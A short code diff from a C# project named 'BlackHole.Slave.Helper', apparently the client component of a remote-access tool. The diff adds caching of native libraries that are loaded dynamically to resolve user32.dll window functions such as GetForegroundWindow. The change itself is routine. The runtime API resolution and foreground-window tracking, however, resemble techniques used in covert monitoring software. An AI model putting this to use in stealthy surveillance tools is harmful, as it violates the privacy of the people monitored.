@@ -117,8 +117,12 @@ namespace BlackHole.Slave.Helper
             public static dGetWindowText GetWindowText = DynamicNativeCall<dGetWindowText>("user32.dll", "GetWindowTextW");
             public static dGetWindowThreadProcessId GetWindowThreadProcessId = DynamicNativeCall<dGetWindowThreadProcessId>("user32.dll", "GetWindowThreadProcessId");
             public static dGetForegroundWindow GetForegroundWindow = DynamicNativeCall<dGetForegroundWindow>("user32.dll", "GetForegroundWindow");
-
         }
+        
+        /// <summary>
+        /// 
+        /// </summary>
+        private static Dictionary<string, DynamicNativeLibrary> m_loadedLibraries = new Dictionary<string, DynamicNativeLibrary>();
 
         /// <summary>
         /// 
@@ -130,8 +134,10 @@ namespace BlackHole.Slave.Helper
         /// <param name="callback"></param>
         public static TFunc DynamicNativeCall<TFunc>(string fileName, string functionName) where TFunc : class
         {
-            using (var nativeLibrary = new DynamicNativeLibrary(fileName))            
-                return nativeLibrary.FindUmanagedFunction<TFunc>(functionName);            
+            // we cache loaded libraries
+            if (!m_loadedLibraries.ContainsKey(fileName))
+                m_loadedLibraries[fileName] = new DynamicNativeLibrary(fileName);
+            return m_loadedLibraries[fileName].FindUmanagedFunction<TFunc>(functionName);            
         }
     }
 }
